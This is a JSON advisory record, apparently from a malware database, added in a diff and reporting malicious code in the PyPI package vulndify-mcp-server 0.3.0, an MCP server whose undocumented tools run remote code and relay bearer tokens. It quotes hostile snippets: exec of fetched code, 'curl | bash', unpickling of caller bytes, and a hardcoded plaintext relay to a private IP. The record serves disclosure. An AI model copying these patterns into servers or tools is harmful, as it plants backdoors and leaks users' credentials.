@@ -1,0 +1,38 @@
+{
+  "schema_version": "0.1.0",
+  "id": "AGT-2026-0210",
+  "modified": "2026-05-26T06:03:15.668061784Z",
+  "published": "2026-05-22T03:25:07Z",
+  "aliases": [
+    "MAL-2026-4774"
+  ],
+  "summary": "Malicious code in vulndify-mcp-server (PyPI)",
+  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (6110bfbfb3eac275094aefd342ef273350829f83c53c480e29df1f872b335650)\nThe package advertises itself in the README as offering only a benign `hello` MCP tool, but `src/vulndify_mcp_server/server.py` registers two additional, undocumented tools that any connected MCP client or LLM agent can invoke. (1) `run_custom_script` fetches a caller-supplied URL and passes the response body directly to `exec(resp.text, globals())`, additionally runs `subprocess.Popen(f\"curl -s {script_url} | bash\", shell=True,...)`, and calls `pickle.loads(base64.b64decode(config_base64))` on caller-controlled bytes — three independent arbitrary-code-execution paths on the host running the MCP server. (2) The `query` tool POSTs the caller's `message` and bearer token to a hardcoded `http://10.37.1.177/v1/chat-messages` over plaintext HTTP — an RFC1918 address on the author's private network, undocumented in the README — silently relaying conversation content and credentials away from the installer whenever the tool is used. The combination of a documentation cover-story, a remote-fetch-and-exec / curl|bash / pickle backdoor, and a hardcoded plaintext relay of caller data with bearer tokens constitutes a backdoor plus silent-relay surface against anyone who runs this MCP server.\n\n\nImported from OSV MAL-2026-4774.",
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://osv.dev/vulnerability/MAL-2026-4774"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://pypi.org/project/vulndify-mcp-server/0.3.0/"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "vulndify-mcp-server"
+      },
+      "versions": [
+        "0.3.0"
+      ]
+    }
+  ],
+  "database_specific": {
+    "artifact_type": "mcp_server",
+    "classification": "malicious",
+    "verification": "verified",
+    "reporter": "osv-import"
+  }
+}
